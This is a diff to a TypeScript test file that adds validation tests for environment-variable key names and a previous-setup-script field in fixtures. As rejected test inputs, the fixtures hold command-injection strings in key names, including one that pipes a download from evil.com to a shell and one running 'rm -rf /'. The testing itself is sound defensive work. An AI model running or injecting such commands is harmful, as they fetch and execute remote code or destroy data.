@@ -22,6 +22,8 @@ vi.mock("@/lib/db/prisma", () => ({
 import {
   decryptEnvironmentVariables,
   encryptEnvironmentVariables,
+  findInvalidEnvVarKey,
+  isValidEnvVarKey,
   resolveDomainAllowList,
   getOrCreateDefaultEnvironment,
   type ResolvedEnvironment,
@@ -85,6 +87,49 @@ describe("encryptEnvironmentVariables", () => {
   it("trims keys and drops blank ones", () => {
     const out = encryptEnvironmentVariables({ "  A  ": "1", "": "2", "   ": "3" })
     expect(Object.keys(out)).toEqual(["A"])
+  })
+
+  it("drops a key with a shell metacharacter instead of storing it", () => {
+    const out = encryptEnvironmentVariables({ "X; curl evil.com | sh; Y": "1", GOOD: "2" })
+    expect(Object.keys(out)).toEqual(["GOOD"])
+  })
+
+  it("drops a key that starts with a digit", () => {
+    const out = encryptEnvironmentVariables({ "9FOO": "1", GOOD: "2" })
+    expect(Object.keys(out)).toEqual(["GOOD"])
+  })
+})
+
+describe("isValidEnvVarKey", () => {
+  it("accepts POSIX-shaped names", () => {
+    expect(isValidEnvVarKey("FOO")).toBe(true)
+    expect(isValidEnvVarKey("_FOO_BAR9")).toBe(true)
+  })
+
+  it("rejects a key with a shell metacharacter", () => {
+    expect(isValidEnvVarKey("X; curl evil.com | sh; Y")).toBe(false)
+  })
+
+  it("rejects a key starting with a digit", () => {
+    expect(isValidEnvVarKey("9FOO")).toBe(false)
+  })
+})
+
+describe("findInvalidEnvVarKey", () => {
+  it("returns null when every key is valid", () => {
+    expect(findInvalidEnvVarKey({ FOO: "1", BAR_9: "2" })).toBeNull()
+  })
+
+  it("returns null for a blank key: those are dropped, not rejected", () => {
+    expect(findInvalidEnvVarKey({ "": "1", "   ": "2" })).toBeNull()
+  })
+
+  it("returns the offending key with a shell metacharacter", () => {
+    expect(findInvalidEnvVarKey({ FOO: "1", "X; rm -rf /": "2" })).toBe("X; rm -rf /")
+  })
+
+  it("returns the offending key that starts with a digit", () => {
+    expect(findInvalidEnvVarKey({ FOO: "1", "9BAR": "2" })).toBe("9BAR")
   })
 })
 
@@ -215,6 +260,7 @@ describe("toEnvironmentDTO", () => {
       allowedDomains: [],
       environmentVariables: encrypted,
       setupScript: "echo hi",
+      setupScriptPrevious: "echo old",
       setupScriptUpdatedBy: "agent",
       updatedAt: now,
     })
@@ -230,6 +276,7 @@ describe("toEnvironmentDTO", () => {
       variableCount: 1,
       hasSetupScript: true,
       setupScript: "echo hi",
+      setupScriptPrevious: "echo old",
       setupScriptUpdatedBy: "agent",
       updatedAt: now.getTime(),
     })
@@ -249,6 +296,7 @@ describe("toEnvironmentDTO", () => {
         allowedDomains: [],
         environmentVariables: encrypted,
         setupScript: null,
+        setupScriptPrevious: null,
         setupScriptUpdatedBy: null,
         updatedAt: new Date(),
       },
@@ -270,6 +318,7 @@ describe("toEnvironmentDTO", () => {
       allowedDomains: [],
       environmentVariables: null,
       setupScript: null,
+      setupScriptPrevious: null,
       setupScriptUpdatedBy: null,
       updatedAt: new Date(),
     })
@@ -289,6 +338,7 @@ describe("toEnvironmentDTO", () => {
       allowedDomains: [],
       environmentVariables: null,
       setupScript: null,
+      setupScriptPrevious: null,
       setupScriptUpdatedBy: "garbage",
       updatedAt: new Date(),
     })
